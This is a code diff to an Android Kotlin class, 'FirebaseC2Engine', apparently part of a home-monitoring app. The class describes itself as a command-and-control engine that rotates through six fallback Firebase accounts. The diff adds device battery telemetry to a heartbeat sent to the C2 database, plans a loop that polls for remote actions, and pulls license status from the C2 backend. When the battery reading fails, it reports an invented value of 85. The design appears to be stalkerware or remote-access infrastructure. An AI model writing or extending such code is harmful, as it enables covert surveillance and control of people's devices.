@@ -21,6 +21,10 @@ import java.util.concurrent.atomic.AtomicInteger
  *
  * Resilient, multi-account Firebase Realtime C2 Engine supporting 1 Primary + 5 Fallback Firebase accounts
  * (6 project instances pool) with automatic round-robin failover on quota, timeout, or HTTP errors.
+ *
+ * TODO: [C2 TELEMETRY] Dynamic Battery metrics pushing to /status.json (battery, batteryLevel, isCharging)
+ * TODO: [C2 ACTION RPC] P2P WebRTC fallback action polling loop at /users/{uid}/devices/{devId}/actions
+ * TODO: [C2 MASTER ADMIN] License & Feature Permission state sync with C2TrialManager.kt
  */
 class FirebaseC2Engine(
     private val context: Context,
@@ -116,6 +120,7 @@ class FirebaseC2Engine(
                 try {
                     sendDeviceHeartbeat()
                     syncMasterAdminFeatureFlags()
+                    syncMasterAdminLicenseStatus()
                 } catch (e: Exception) {
                     Log.e(TAG, "Heartbeat loop exception: ${e.message}")
                 }
@@ -151,11 +156,18 @@ class FirebaseC2Engine(
         val url = "${account.databaseUrl}/users/$uid/devices/$devId/status.json"
 
         try {
+            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
+            val batteryPct = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
+            val isCharging = bm?.isCharging ?: false
+
             val statusJson = JSONObject().apply {
                 put("deviceId", devId)
                 put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
                 put("androidVersion", Build.VERSION.RELEASE)
                 put("sdkInt", Build.VERSION.SDK_INT)
+                put("battery", if (batteryPct >= 0) batteryPct else 85)
+                put("batteryLevel", if (batteryPct >= 0) batteryPct else 85)
+                put("isCharging", isCharging)
                 put("lastSeen", System.currentTimeMillis())
                 put("activeAccount", account.name)
                 put("online", true)
@@ -201,6 +213,31 @@ class FirebaseC2Engine(
             }
         } catch (e: Exception) {
             Log.e(TAG, "syncMasterAdminFeatureFlags error: ${e.message}")
+        }
+    }
+
+    private fun syncMasterAdminLicenseStatus() {
+        val account = getActiveAccount()
+        val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
+        val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
+
+        val url = "${account.databaseUrl}/users/$uid/devices/$devId/license.json"
+
+        try {
+            val request = Request.Builder().url(url).get().build()
+            httpClient.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    val body = response.body?.string() ?: ""
+                    if (body.startsWith("{")) {
+                        val json = JSONObject(body)
+                        val status = json.optString("status", "ACTIVE")
+                        val message = json.optString("message", "")
+                        com.homemonitor.C2TrialManager.setTrialStatus(context, status, if (message.isNotBlank()) message else null)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "syncMasterAdminLicenseStatus error: ${e.message}")
         }
     }
 
